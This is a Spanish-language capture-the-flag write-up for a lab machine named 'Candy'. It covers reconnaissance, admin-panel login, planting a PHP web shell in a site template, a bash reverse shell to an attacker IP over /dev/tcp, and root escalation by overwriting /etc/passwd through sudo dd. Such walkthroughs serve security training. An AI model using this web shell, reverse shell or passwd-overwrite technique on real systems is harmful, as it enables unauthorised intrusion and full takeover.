
![[20250802134717.png]](candy-images/20250802134717.png)


# Fase de Reconocimiento

## nmap

Empezamos con un escaneo básico de puertos con nmap 

```bash
nmap -p- --open --min-rate 5000 -sS -vvv -n -Pn 172.17.0.2 -oG allPorts
```

Después una vez sabemos que puertos están abiertos vamos a hacer un escaneo con scripts básicos de nmap para ver servicios y versiones 

```bash
nmap -p80 -sCV 172.17.0.2 -oN targeted
```

![[20250802152112.png]]

vemos que el escaneo de nmap ha encontrado varias rutas que se muestran dentro del archivo robots.txt

## Http

![[20250802152223.png]]

vemos credenciales para admin. y una ruta que pone un_caramelo como la maquina se llama candy me llama la atencion podria ser una pista del creador

![[20250802152533.png]]

Encontramos una pagina en construccion:

vamos a ver el codigo fuente de la pagina. pulsando Ctrl + U nos mostrara el codigo 


![[20250802152619.png]]

al final podemos ver esto el caramelito son las credenciales que hemos encontrado antes así que vamos a probarlas directamente pero donde?


# Fase de Explotación 

entramos en la pagina web y vemos lo siguiente

![[20250802160809.png]]

probamos aqui las credenciales 

![[20250802160841.png]]
![[20250802160857.png]]

En la ruta `http://172.17.0.2/administrator/` también tenemos un panel de login.

![[20250802161014.png]]

Pero tampoco funcionan las credenciales.

Vamos a probar a desencriptar la contraseña ya que es posible que no este escrita en texto plano.

## Base64

probamos a descifrar un posible base 64 

```bash
echo 'c2FubHVpczEyMzQ1' |base64 -d
```

![[20250802161152.png]]

el resultado es `sanluis12345` esto pinta a contraseña a si que volvamos a probar

Probamos en el panel de login de /administrator con la  contraseña `sanluis12345`

![[20250802165050.png]]

y conseguimos acceso al panel de administracion


en la ventana de System ->  site templates

![[20250802165513.png]]

podemos ver esto 
![[20250802165537.png]]

Si recordamos como era el Home vemos que es el mismo nombre de la pagina CASSIOPEIA

![[20250802165611.png]]

Pulsamos en el enlace y nos redirige a una pagina con el nombre de los archivos php que corren por detras pulsamos en index.php y aparece el codigo fuente eel cual podemos modificar
![[20250802165810.png]]

## PHP malicioso

En este espacio que muestro en la captura de pantalla vamos a escribir lo siguiente 

```bash
<?php system($_GET['fatality']); ?>	
```

Podéis cambiar `fatality` por `cmd` , `shadow` ... Podéis poner el nombre que queráis yo elijo fatality por el juego de mortal kombat donde el fatality representa el golpe final. ya que esto nos permitirá conseguir acceso a la maquina me parece optimo nombrarlo fatality 

![[20250802165931.png]]

Perfecto una vez puesto el php malicioso pulsamos en guardar y vamos a visitar el index.php de nuevo

![[20250802170215.png]]

Vemos que esta vez no hay panel de login asi que vamos a probar si el php esta funcionando

```bash
http://172.17.0.2/index.php?fatality=id
```

![[20250802170435.png]]

Podemos ver que si que es funcional nos permite ejecutar comandos por lo que vamos a lanzarnos una shell

## Shell

En nuestra maquina atacante nos ponemos en escucha por el puerto que queramos en mi caso el 443

```bash
nc -nlvp 443
```

Y en la Url victima pondremos lo siguiente 

```bash
http://172.17.0.2/index.php?fatality=bash -c "bash -i %26>/dev/tcp/192.168.1.182/443 0>%261"
```

![[20250802170824.png]]

tenemos shell 

# FASE POST EXPLOTACION

Ya que la maquina se llama candy y nos han dado un caramelo en la fase de explotacion vamos a comprobar si nos han dejado otro caramelito en la fase de post explotacion

```bash
find / *.txt 2>/dev/null |grep "caramelo"
```

con este comando vamos a buscar desde la raiz del sistema un archivo de texto que contenga la palabra caramelo

![[20250802171141.png]]

aqui podemos ver el primero caramelo y otro_caramelo.txt

```bash
cat /var/backups/hidden/otro_caramelo.txt
```

![[20250802171256.png]]

nos dejan ver el usuario luisillo con su correspondiente contraseña

asi que vamos a migrar al usuario 

```bash
su luisillo
```

![[20250802171349.png]]

![[20250802171419.png]]

perfecto ahora vamos a hacer que la shell sea mejor para poder trabajar

## Tratamiento de shell

```bash
script /dev/null -c bash
```

luego pulsamos Ctrl + z

y en nuestra terminal de atacante ponemos 

```bash
stty raw -echo; fg 
```

pulsamos enter y ponemos 

```bash
export TERM=xterm
```


## Escalada de privilegios

```bash
sudo -l
```

![[20250802171839.png]]

aqui aparece esto tenemos permisos para usar el binario /bin/dd como sudo sin contraseña

Bucamos en GTFObins 
![[20250802172043.png]]

![[20250802172102.png]]

vemos que este binario nos permite modificar archivos como si fuéramos root por lo que tratemos de abusar de esto

lo primero vamos a copiarnos el /etc/passwd en un archivo en nuestro directorio /home/luisillo

```bash
cat /etc/passwd > pass
```

ahora vamos a usar openssl para crear una contraseña que le asignaremos al usuario root

```bash
openssl passwd
```

![[20250802172547.png]]

pondremos la contraseña que queramos ya que esa será la nueva contraseña del usuario root

![[20250802172645.png]]

una vez escrita la contraseña nos devolverá esto `$1$TdTa/Isd$1XMz0MxaRRXJ6B11MTcvl0` 

ahora vamos a modificar el /etc/passwd que teniamos en el archivo pass

```bash
nano pass
```

![[20250802172819.png]]

cambiaremos la primera x de  `root:x:0:0:root:/root:/bin/bash` por el codigo del openssl `root:$1$TdTa/Isd$1XMz0MxaRRXJ6B11MTcvl0:0:0:root:/root:/bin/bash` 

y aguardamos el archivo

ahora utilizando el privilegio de sudo en el binario dd vamos a ejecutar el siguiente comando

```bash
cat pass | sudo dd of=/etc/passwd
```

![[20250802173110.png]]

comprobamos que se haya ejecutado correctamente 

```bash
cat /etc/passwd
```

![[20250802173149.png]]

vemos que si por lo que haremos 

```bash
su root
```

y la contraseña que pusimos en el openssl

![[20250802173237.png]]

y hi lo tenemos acceso al sistema con usuario administrador "root"
